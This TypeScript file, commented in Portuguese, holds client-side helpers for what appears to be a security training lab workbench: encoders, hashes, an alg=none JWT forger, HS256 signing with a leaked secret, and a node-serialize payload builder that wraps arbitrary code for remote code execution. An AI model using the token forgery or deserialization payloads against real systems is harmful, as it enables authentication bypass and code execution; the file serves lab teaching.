/**
 * Ferramentas de exploração (client-side, sem backend) usadas no workbench.
 * Transformações puras que o dev aplica para MONTAR os payloads de cada lab:
 * Base64/Base64URL, URL-encode, JWT (decode / alg=none / HS256), hashes
 * (MD5/SHA-256) e o wrapper de desserialização node-serialize.
 */

// ───────── Base64 (UTF-8 safe) ─────────
export const b64encode = (s: string): string => btoa(unescape(encodeURIComponent(s)));
export const b64decode = (s: string): string => decodeURIComponent(escape(atob(s)));
export const b64urlEncode = (s: string): string =>
  b64encode(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
export const b64urlDecode = (s: string): string => {
  const pad = s.length % 4 === 0 ? '' : '='.repeat(4 - (s.length % 4));
  return b64decode(s.replace(/-/g, '+').replace(/_/g, '/') + pad);
};

// ───────── URL ─────────
export const urlEncode = (s: string): string => encodeURIComponent(s);
export const urlDecode = (s: string): string => decodeURIComponent(s);

// ───────── JSON ─────────
export const jsonPretty = (s: string): string => JSON.stringify(JSON.parse(s), null, 2);
export const jsonMinify = (s: string): string => JSON.stringify(JSON.parse(s));

// ───────── JWT ─────────
const bytesToB64url = (buf: ArrayBuffer): string => {
  const bytes = new Uint8Array(buf);
  let bin = '';
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
};

export interface JwtParts { header: string; payload: string; signature: string; }

/** Decodifica as 3 partes de um JWT (header/payload em JSON legível). */
export function jwtDecode(token: string): JwtParts {
  const [h = '', p = '', s = ''] = token.trim().split('.');
  const safe = (part: string) => {
    try { return JSON.stringify(JSON.parse(b64urlDecode(part)), null, 2); } catch { return b64urlDecode(part); }
  };
  return { header: safe(h), payload: safe(p), signature: s };
}

/** Forja um JWT com alg=none (sem assinatura): header.payload. */
export function jwtForgeNone(payloadJson: string): string {
  const payload = JSON.stringify(JSON.parse(payloadJson)); // valida/minifica
  const header = b64urlEncode(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  return `${header}.${b64urlEncode(payload)}.`;
}

/** Assina um JWT HS256 com um segredo (ex.: o JWT_SECRET vazado no A05). */
export async function jwtSignHS256(payloadJson: string, secret: string): Promise<string> {
  const payload = JSON.stringify(JSON.parse(payloadJson));
  const header = b64urlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const body = b64urlEncode(payload);
  const key = await crypto.subtle.importKey(
    'raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'],
  );
  const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(`${header}.${body}`));
  return `${header}.${body}.${bytesToB64url(sig)}`;
}

// ───────── Hashes ─────────
export async function sha256(s: string): Promise<string> {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('');
}

/** MD5 (RFC 1321) — o hash fraco que o backend dos labs usa p/ senhas. */
export function md5(str: string): string {
  const utf8 = unescape(encodeURIComponent(str));
  const add32 = (a: number, b: number) => (a + b) & 0xffffffff;
  const rol = (n: number, c: number) => (n << c) | (n >>> (32 - c));
  function cmn(q: number, a: number, b: number, x: number, s: number, t: number) {
    return add32(rol(add32(add32(a, q), add32(x, t)), s), b);
  }
  const ff = (a: number, b: number, c: number, d: number, x: number, s: number, t: number) => cmn((b & c) | (~b & d), a, b, x, s, t);
  const gg = (a: number, b: number, c: number, d: number, x: number, s: number, t: number) => cmn((b & d) | (c & ~d), a, b, x, s, t);
  const hh = (a: number, b: number, c: number, d: number, x: number, s: number, t: number) => cmn(b ^ c ^ d, a, b, x, s, t);
  const ii = (a: number, b: number, c: number, d: number, x: number, s: number, t: number) => cmn(c ^ (b | ~d), a, b, x, s, t);

  const n = utf8.length;
  const words: number[] = [];
  for (let i = 0; i < n; i++) words[i >> 2] = (words[i >> 2] || 0) | (utf8.charCodeAt(i) << ((i % 4) * 8));
  words[n >> 2] = (words[n >> 2] || 0) | (0x80 << ((n % 4) * 8));
  const bitLenIndex = (((n + 8) >> 6) + 1) * 16 - 2;
  while (words.length <= bitLenIndex + 1) words.push(0);
  words[bitLenIndex] = n * 8;

  let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
  for (let i = 0; i < words.length; i += 16) {
    const oa = a, ob = b, oc = c, od = d;
    const x = (k: number) => words[i + k] | 0;
    a = ff(a, b, c, d, x(0), 7, -680876936); d = ff(d, a, b, c, x(1), 12, -389564586); c = ff(c, d, a, b, x(2), 17, 606105819); b = ff(b, c, d, a, x(3), 22, -1044525330);
    a = ff(a, b, c, d, x(4), 7, -176418897); d = ff(d, a, b, c, x(5), 12, 1200080426); c = ff(c, d, a, b, x(6), 17, -1473231341); b = ff(b, c, d, a, x(7), 22, -45705983);
    a = ff(a, b, c, d, x(8), 7, 1770035416); d = ff(d, a, b, c, x(9), 12, -1958414417); c = ff(c, d, a, b, x(10), 17, -42063); b = ff(b, c, d, a, x(11), 22, -1990404162);
    a = ff(a, b, c, d, x(12), 7, 1804603682); d = ff(d, a, b, c, x(13), 12, -40341101); c = ff(c, d, a, b, x(14), 17, -1502002290); b = ff(b, c, d, a, x(15), 22, 1236535329);
    a = gg(a, b, c, d, x(1), 5, -165796510); d = gg(d, a, b, c, x(6), 9, -1069501632); c = gg(c, d, a, b, x(11), 14, 643717713); b = gg(b, c, d, a, x(0), 20, -373897302);
    a = gg(a, b, c, d, x(5), 5, -701558691); d = gg(d, a, b, c, x(10), 9, 38016083); c = gg(c, d, a, b, x(15), 14, -660478335); b = gg(b, c, d, a, x(4), 20, -405537848);
    a = gg(a, b, c, d, x(9), 5, 568446438); d = gg(d, a, b, c, x(14), 9, -1019803690); c = gg(c, d, a, b, x(3), 14, -187363961); b = gg(b, c, d, a, x(8), 20, 1163531501);
    a = gg(a, b, c, d, x(13), 5, -1444681467); d = gg(d, a, b, c, x(2), 9, -51403784); c = gg(c, d, a, b, x(7), 14, 1735328473); b = gg(b, c, d, a, x(12), 20, -1926607734);
    a = hh(a, b, c, d, x(5), 4, -378558); d = hh(d, a, b, c, x(8), 11, -2022574463); c = hh(c, d, a, b, x(11), 16, 1839030562); b = hh(b, c, d, a, x(14), 23, -35309556);
    a = hh(a, b, c, d, x(1), 4, -1530992060); d = hh(d, a, b, c, x(4), 11, 1272893353); c = hh(c, d, a, b, x(7), 16, -155497632); b = hh(b, c, d, a, x(10), 23, -1094730640);
    a = hh(a, b, c, d, x(13), 4, 681279174); d = hh(d, a, b, c, x(0), 11, -358537222); c = hh(c, d, a, b, x(3), 16, -722521979); b = hh(b, c, d, a, x(6), 23, 76029189);
    a = hh(a, b, c, d, x(9), 4, -640364487); d = hh(d, a, b, c, x(12), 11, -421815835); c = hh(c, d, a, b, x(15), 16, 530742520); b = hh(b, c, d, a, x(2), 23, -995338651);
    a = ii(a, b, c, d, x(0), 6, -198630844); d = ii(d, a, b, c, x(7), 10, 1126891415); c = ii(c, d, a, b, x(14), 15, -1416354905); b = ii(b, c, d, a, x(5), 21, -57434055);
    a = ii(a, b, c, d, x(12), 6, 1700485571); d = ii(d, a, b, c, x(3), 10, -1894986606); c = ii(c, d, a, b, x(10), 15, -1051523); b = ii(b, c, d, a, x(1), 21, -2054922799);
    a = ii(a, b, c, d, x(8), 6, 1873313359); d = ii(d, a, b, c, x(15), 10, -30611744); c = ii(c, d, a, b, x(6), 15, -1560198380); b = ii(b, c, d, a, x(13), 21, 1309151649);
    a = ii(a, b, c, d, x(4), 6, -145523070); d = ii(d, a, b, c, x(11), 10, -1120210379); c = ii(c, d, a, b, x(2), 15, 718787259); b = ii(b, c, d, a, x(9), 21, -343485551);
    a = add32(a, oa); b = add32(b, ob); c = add32(c, oc); d = add32(d, od);
  }
  const hex = (x: number) => {
    let s = '';
    for (let i = 0; i < 4; i++) s += ((x >> (i * 8)) & 0xff).toString(16).padStart(2, '0');
    return s;
  };
  return hex(a) + hex(b) + hex(c) + hex(d);
}

// ───────── node-serialize (A08) ─────────
/** Monta o payload de desserialização insegura: IIFE marcada com _$$ND_FUNC$$_. */
export function nodeSerializePayload(jsCode: string, key = 'rce'): string {
  const fn = `_$$ND_FUNC$$_function(){${jsCode}}()`;
  return JSON.stringify({ [key]: fn });
}
